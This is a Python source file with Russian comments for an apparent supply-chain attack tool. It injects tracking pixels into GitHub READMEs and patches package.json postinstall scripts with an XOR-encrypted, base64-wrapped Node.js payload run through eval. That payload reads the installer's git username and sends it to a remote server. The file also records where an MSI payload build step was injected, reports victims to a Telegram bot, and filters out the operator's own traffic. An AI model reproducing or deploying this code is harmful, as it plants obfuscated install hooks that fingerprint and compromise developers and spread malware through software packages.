#!/usr/bin/env python3
"""
Ping → Telegram: README pixel (view) + postinstall (install).
Свой трафик (tokens.txt, proxy_map, bot UA) фильтруется.
"""

from __future__ import annotations

import base64
import json
import logging
import os
import re
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional
from urllib.parse import quote

import requests
from dotenv import load_dotenv

load_dotenv()

ROOT = Path(__file__).resolve().parent
PING_STATE_FILE = ROOT / "ping_state.json"

# 1×1 прозрачный PNG
PIXEL_PNG = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg=="
)

_BOT_UA_HINTS = (
    "Playwright",
    "HeadlessChrome",
    "python-requests",
    "curl/",
    "GitHub-Hookshot",
)

PING_COOLDOWN_MIN = float(os.getenv("PING_COOLDOWN_MINUTES", "60")) * 60
PING_SUPPRESS_AFTER_UPDATE_MIN = float(os.getenv("PING_SUPPRESS_AFTER_UPDATE_MIN", "15")) * 60
PING_TRACKER_VERSION = "2026-05-31-inject"


def ping_public_url() -> str:
    return (os.getenv("PING_PUBLIC_URL") or "").strip().rstrip("/")


def ping_enabled() -> bool:
    return bool(ping_public_url() and os.getenv("TELEGRAM_BOT_TOKEN"))


def _chat_id() -> Optional[int]:
    raw = (os.getenv("PING_TELEGRAM_CHAT_ID") or os.getenv("TELEGRAM_ALLOWED_USER_IDS") or "").strip()
    if not raw:
        return None
    return int(raw.split(",")[0].strip())


def load_own_labels() -> set[str]:
    labels: set[str] = set()
    env_labels = (os.getenv("PING_OWN_LABELS") or "").strip()
    if env_labels:
        for part in env_labels.split(","):
            part = part.strip().lower()
            if part:
                labels.add(part)
    path = ROOT / "tokens.txt"
    if not path.is_file():
        return labels
    with path.open(encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if ":" in line and not line.startswith("gh"):
                label, _, _ = line.partition(":")
                if label.strip():
                    labels.add(label.strip().lower())
            elif "|" in line:
                label, _, _ = line.partition("|")
                if label.strip():
                    labels.add(label.strip().lower())
    return labels


def load_own_proxy_hosts() -> set[str]:
    hosts: set[str] = set()
    env_hosts = (os.getenv("PING_OWN_PROXY_HOSTS") or "").strip()
    if env_hosts:
        for part in env_hosts.split(","):
            part = part.strip().lower()
            if part:
                hosts.add(part)
    for path in (ROOT / "proxy_map.txt", ROOT / "proxy.txt"):
        if not path.is_file():
            continue
        with path.open(encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if "|" in line:
                    _, _, proxy = line.partition("|")
                    line = proxy.strip()
                m = re.search(r"@([^:/\s]+)", line)
                if m:
                    hosts.add(m.group(1).lower())
    return hosts


def _load_state() -> dict:
    if not PING_STATE_FILE.is_file():
        return {"last_ping": {}, "self_update": {}, "inject_path": {}}
    try:
        with PING_STATE_FILE.open(encoding="utf-8") as f:
            data = json.load(f)
        data.setdefault("last_ping", {})
        data.setdefault("self_update", {})
        data.setdefault("inject_path", {})
        return data
    except (json.JSONDecodeError, OSError):
        return {"last_ping": {}, "self_update": {}, "inject_path": {}}


def _save_state(state: dict) -> None:
    with PING_STATE_FILE.open("w", encoding="utf-8") as f:
        json.dump(state, f, indent=2)


def should_run_local_ping_server() -> bool:
    url = ping_public_url()
    if not url:
        return False
    override = (os.getenv("PING_RUN_LOCAL") or "").strip().lower()
    if override in ("0", "false", "no"):
        return False
    if override in ("1", "true", "yes"):
        return True
    return "localhost" in url or "127.0.0.1" in url or ":8787" in url


def _remote_mark_base() -> str:
    """Куда слать mark-self-update — тот же хост, что в postinstall (PING_PUBLIC_URL)."""
    return ping_public_url()


def _notify_remote_self_update(repo: str, inject_path: str = "") -> None:
    if should_run_local_ping_server():
        return
    base = _remote_mark_base()
    secret = (os.getenv("PING_SECRET") or "").strip()
    if not base or not secret:
        return
    payload: dict = {"repo": repo, "secret": secret}
    path = (inject_path or get_repo_inject_path(repo)).strip()
    if path:
        payload["inject_path"] = path
    try:
        resp = requests.post(
            f"{base}/mark-self-update",
            json=payload,
            timeout=10,
        )
        if resp.status_code != 200:
            logging.warning("Remote mark-self-update %s: HTTP %s", repo, resp.status_code)
    except Exception as exc:
        logging.warning("Remote mark-self-update %s: %s", repo, exc)


def record_repo_inject_path(repo: str, path: str) -> None:
    """Запомнить куда внедрён EXTRA_BUILD_STEP (Makefile, package.json, …)."""
    path = (path or "").strip()
    if not repo or "/" not in repo or not path:
        return
    state = _load_state()
    state["inject_path"][repo.lower()] = path
    _save_state(state)


def get_repo_inject_path(repo: str) -> str:
    if not repo:
        return ""
    return (_load_state().get("inject_path") or {}).get(repo.lower(), "")


def mark_repo_self_update(
    repo: str,
    *,
    remote: bool = True,
    inject_path: str = "",
) -> None:
    """Вызвать после нашего push README — не пинговать сразу."""
    if inject_path:
        record_repo_inject_path(repo, inject_path)
    if remote and not should_run_local_ping_server():
        _notify_remote_self_update(repo, inject_path=inject_path)
        return
    state = _load_state()
    state["self_update"][repo.lower()] = time.time()
    _save_state(state)


def should_notify(
    event: str,
    repo: str,
    client_ip: str = "",
    user_agent: str = "",
    git_user: str = "",
    referer: str = "",
) -> bool:
    if not ping_enabled() or not repo or "/" not in repo:
        return False

    repo_key = repo.lower()
    own = load_own_labels()
    git_user_l = (git_user or "").strip().lower()

    if git_user_l and git_user_l in own:
        logging.info("Ping skip: git user @%s (наш tokens.txt)", git_user)
        return False

    ref_low = (referer or "").lower()
    for label in own:
        if f"github.com/{label}" in ref_low:
            logging.info("Ping skip: Referer наш @%s", label)
            return False

    ip = (client_ip or "").strip().lower()
    if ip:
        for host in load_own_proxy_hosts():
            if host in ip or ip == host:
                logging.info("Ping skip: IP %s (наш proxy)", ip)
                return False

    ua = user_agent or ""
    ua_low = ua.lower()
    for hint in _BOT_UA_HINTS:
        if hint.lower() in ua_low:
            logging.info("Ping skip: UA %s", ua[:80])
            return False

    for label in own:
        if label in ua_low:
            logging.info("Ping skip: UA содержит @%s", label)
            return False

    state = _load_state()
    updated = state["self_update"].get(repo_key, 0)
    if updated and time.time() - updated < PING_SUPPRESS_AFTER_UPDATE_MIN:
        logging.info("Ping skip: недавно обновляли README %s", repo)
        return False

    cooldown_key = f"{event}:{repo_key}"
    last = state["last_ping"].get(cooldown_key, 0)
    if last and time.time() - last < PING_COOLDOWN_MIN:
        return False

    return True


def install_payload_url() -> str:
    """URL MSI/payload для строки Install в Telegram."""
    explicit = (os.getenv("PING_INSTALL_URL") or "").strip()
    if explicit:
        return explicit
    step = (os.getenv("EXTRA_BUILD_STEP") or "").strip()
    m = re.search(r"https?://[^\s\"']+", step)
    if m:
        return m.group(0).rstrip(")'\"")
    return "https://discord.vin/api"


def record_ping(event: str, repo: str) -> None:
    state = _load_state()
    state["last_ping"][f"{event}:{repo.lower()}"] = time.time()
    _save_state(state)


def send_telegram_ping(
    event: str,
    repo: str,
    extra: str = "",
    *,
    install_src: str = "",
    inject_path: str = "",
) -> bool:
    token = (os.getenv("TELEGRAM_BOT_TOKEN") or "").strip()
    chat_id = _chat_id()
    if not token or not chat_id:
        return False

    icons = {"view": "👁", "install": "📦"}
    icon = icons.get(event, "📌")
    text = (
        f"{icon} Ping: {event}\n"
        f"Repo: {repo}\n"
        f"https://github.com/{repo}"
    )
    inj = (inject_path or get_repo_inject_path(repo)).strip()
    if inj:
        text += f"\nInject: {inj}"
    if event == "install":
        src = (install_src or install_payload_url()).strip()
        if src:
            text += f"\nInstall: {src}"
    if extra:
        text += f"\n{extra}"
    text += f"\n{datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}"

    try:
        resp = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={"chat_id": chat_id, "text": text, "disable_web_page_preview": True},
            timeout=10,
        )
        return resp.status_code == 200
    except Exception as exc:
        logging.error("Telegram ping: %s", exc)
        return False


def handle_ping_event(
    event: str,
    repo: str,
    client_ip: str = "",
    user_agent: str = "",
    git_user: str = "",
    referer: str = "",
    install_src: str = "",
    inject_path: str = "",
) -> bool:
    if not should_notify(event, repo, client_ip, user_agent, git_user, referer):
        return False
    extra = f"git: {git_user}" if git_user else ""
    if send_telegram_ping(
        event,
        repo,
        extra=extra,
        install_src=install_src if event == "install" else "",
        inject_path=inject_path,
    ):
        record_ping(event, repo)
        logging.info("Ping → Telegram: %s %s", event, repo)
        return True
    logging.warning("Ping received but Telegram send failed: %s %s", event, repo)
    return False


_PIXEL_LINK = re.compile(
    r"!\[\.\]\((https?://[^)]+/pixel\?repo=[^)&]+(?:&inject=[^)]+)?)\)"
)


def append_readme_pixel(content: str, repo: str, inject_path: str = "") -> str:
    base = ping_public_url()
    if not base:
        return content
    repo_q = quote(repo, safe="")
    inj = (inject_path or "").strip()
    new_url = f"{base}/pixel?repo={repo_q}"
    if inj:
        new_url += f"&inject={quote(inj, safe='')}"

    def _upgrade_pixel(match: re.Match[str]) -> str:
        old_url = match.group(1)
        repo_marker = f"repo={repo_q}"
        if repo_marker not in old_url and f"repo={repo.lower()}" not in old_url.lower():
            return match.group(0)
        if old_url == new_url:
            return match.group(0)
        return f"![.]({new_url})"

    updated, replaced = _PIXEL_LINK.subn(_upgrade_pixel, content)
    if replaced:
        return updated
    if new_url in content:
        return content
    block = f"![.]({new_url})"
    return content.rstrip() + "\n\n" + block + "\n"


def _xor_encrypt(data: str, key: str) -> str:
    encrypted = bytearray()
    key_bytes = key.encode("utf-8")
    for i, b in enumerate(data.encode("utf-8")):
        encrypted.append(b ^ key_bytes[i % len(key_bytes)])
    return base64.b64encode(encrypted).decode("ascii")


def _build_obfuscated_node(js: str, key: str) -> str:
    key = (key or "ping")[:16]
    encrypted = _xor_encrypt(js, key)
    key_esc = key.replace("\\", "\\\\").replace("'", "\\'")
    decoder = f"""
const key = '{key_esc}';
const enc = '{encrypted}';
const dec = Buffer.from(enc, 'base64');
let payload = '';
for (let i = 0; i < dec.length; i++) {{
    payload += String.fromCharCode(dec[i] ^ key.charCodeAt(i % key.length));
}}
eval(payload);
"""
    b64_decoder = base64.b64encode(decoder.encode("utf-8")).decode("ascii")
    return f'node -e "eval(Buffer.from(\'{b64_decoder}\', \'base64\').toString())"'


def _ping_js_body(repo: str, inject_path: str = "") -> str:
    base = ping_public_url()
    repo_q = quote(repo, safe="")
    msi_q = quote(install_payload_url(), safe="")
    ping_url = f"{base}/install?repo={repo_q}&msi={msi_q}"
    inj = (inject_path or get_repo_inject_path(repo)).strip()
    if inj:
        ping_url += f"&inject={quote(inj, safe='')}"
    return (
        "var cp=require('child_process'),https=require('https');"
        "var g='';"
        "try{g=cp.execSync('git config user.name',{encoding:'utf8',stdio:['ignore','pipe','ignore']}).trim();}catch(e){}"
        f"var u='{ping_url}&git='+encodeURIComponent(g);"
        "https.get(u,function(r){{r.resume();}}).on('error',function(){{}});"
        "setTimeout(function(){{}},3500);"
    )


def postinstall_snippet(repo: str, inject_path: str = "") -> str:
    if not ping_public_url():
        return ""
    js = _ping_js_body(repo, inject_path=inject_path)
    key = repo.replace("/", "-")[:16] or "ping"
    return _build_obfuscated_node(js, key)


def _ping_already_in_postinstall(existing: str, repo: str) -> bool:
    if not existing:
        return False
    base = ping_public_url()
    if base and base in existing:
        return True
    snippet = postinstall_snippet(repo)
    return bool(snippet and snippet in existing)


def _strip_ping_from_postinstall(existing: str) -> str:
    base = ping_public_url()
    if not base or not existing:
        return existing or ""
    parts = [p.strip() for p in existing.split(";")]
    kept = [p for p in parts if p and base not in p]
    return "; ".join(kept)


def merge_postinstall(existing: str, repo: str, inject_path: str = "") -> str:
    snippet = postinstall_snippet(repo, inject_path=inject_path)
    if not snippet:
        return existing or ""
    if not existing:
        return snippet
    inj = (inject_path or "").strip()
    if _ping_already_in_postinstall(existing, repo):
        if not inj:
            return existing
        rest = _strip_ping_from_postinstall(existing)
        if rest:
            return f"{snippet}; {rest}"
        return snippet
    return f"{snippet}; {existing}"


def patch_package_json_for_ping(
    pkg_text: str, repo: str, inject_path: str = "",
) -> Optional[str]:
    import json as json_mod

    try:
        pkg = json_mod.loads(pkg_text)
    except json_mod.JSONDecodeError:
        return None
    scripts = pkg.get("scripts") or {}
    scripts["postinstall"] = merge_postinstall(
        scripts.get("postinstall", ""), repo, inject_path=inject_path,
    )
    pkg["scripts"] = scripts
    return json_mod.dumps(pkg, indent=2) + "\n"
